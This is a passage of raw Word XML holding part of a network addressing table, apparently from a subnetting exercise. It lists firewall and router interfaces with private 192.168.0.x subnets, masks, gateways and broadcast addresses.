                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth3</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6BD394C1" w14:textId="39D196A2" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.228/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2EFEA082" w14:textId="113875DB" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79606062" w14:textId="1DD16A9C" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.230</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="015E828C" w14:textId="0F0A9BD9" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.230</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21C2DA8D" w14:textId="2D2980C3" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.231</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00773DC2" w:rsidRPr="00521489" w14:paraId="38F02CE7" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2D4C950C" w14:textId="41FA9544" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Firewall</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6DFEB297" w14:textId="393B8BBE" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>WAN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="5F1644C3" w14:textId="76A3DAAB" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.232/30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7458DB0E" w14:textId="58C85912" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0FD8AFB6" w14:textId="49DE6294" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.234</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="06D983E8" w14:textId="2CB6F320" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.234</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="61A603E4" w14:textId="1542572B" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.235</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00773DC2" w:rsidRPr="00521489" w14:paraId="1FAFD827" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="21F23AFA" w14:textId="77777777" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="64CD51E0" w14:textId="26F4E9B6" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>DMZ</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="33CADC09" w14:textId="2B764E31" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="00773DC2" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.240/</w:t>
            </w:r>
            <w:r w:rsidR="00496900" w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>30</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0868210F" w14:textId="46DE797F" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.252</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1DC9037C" w14:textId="44B42FFA" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.242</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="43976704" w14:textId="4BD8353E" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.241</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2257DC6C" w14:textId="34B27CE0" w:rsidR="00773DC2" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.243</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="000E35C5" w:rsidRPr="00521489" w14:paraId="1062988E" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="191FAAD7" w14:textId="77777777" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6EE9ACAE" w14:textId="55E229F0" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>LAN</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1592805B" w14:textId="4D8E01F4" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.96/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3052E153" w14:textId="255C2BF1" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="769B04D1" w14:textId="59294A9A" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3414B3B2" w14:textId="0AEC7669" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.98</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="193E918D" w14:textId="29ED5C0A" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.127</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="6098DBFB" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4E79C4B0" w14:textId="1DB4AFB4" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Router4</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="307B63BD" w14:textId="2B3D8C2C" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="08AE0E4C" w14:textId="7EAB6E87" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.64/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="18673BC6" w14:textId="6F7642AC" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="4B6CDD51" w14:textId="24A9B30C" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.66</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2A7343B8" w14:textId="2846336C" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.65</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="22F9B4C6" w14:textId="137DC564" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.95</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="006E3376" w:rsidRPr="00521489" w14:paraId="2B4057D1" w14:textId="77777777" w:rsidTr="000E35C5">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="867" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="79EC32C5" w14:textId="77777777" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="943" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="7564AD5E" w14:textId="1ED943EB" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>Eth2</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1649" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="325BEE74" w14:textId="09CC843F" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006E3376">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.96/27</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1573" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0BD7A2FF" w14:textId="748EA2EB" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>255.255.255.224</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6A94D5B8" w14:textId="66CBEF02" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.97</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1372" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6AD7DFD0" w14:textId="325B6031" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.97</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1473" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="76B224F2" w14:textId="1DA68D3A" w:rsidR="006E3376" w:rsidRPr="00521489" w:rsidRDefault="006E3376" w:rsidP="006D500C">
            <w:pPr>
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
            </w:pPr>
            <w:r w:rsidRPr="00521489">
              <w:rPr>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
                <w:lang w:val="en-GB"/>
              </w:rPr>
              <w:t>192.168.0.127</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="66F8A967" w14:textId="77777777" w:rsidR="006D500C" w:rsidRPr="00521489" w:rsidRDefault="006D500C" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3CD3F980" w14:textId="77777777" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3DFCB21E" w14:textId="77777777" w:rsidR="000E35C5" w:rsidRPr="00521489" w:rsidRDefault="000E35C5" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="080A7865" w14:textId="77777777" w:rsidR="00693323" w:rsidRPr="00521489" w:rsidRDefault="00693323" w:rsidP="006D500C">
      <w:pPr>
        <w:rPr>
          <w:sz w:val="24"/>
          <w:szCs w:val="24"/>
          <w:lang w:val="en-GB"/>
        </w:rPr>
      </w:pPr>
    </w:p>
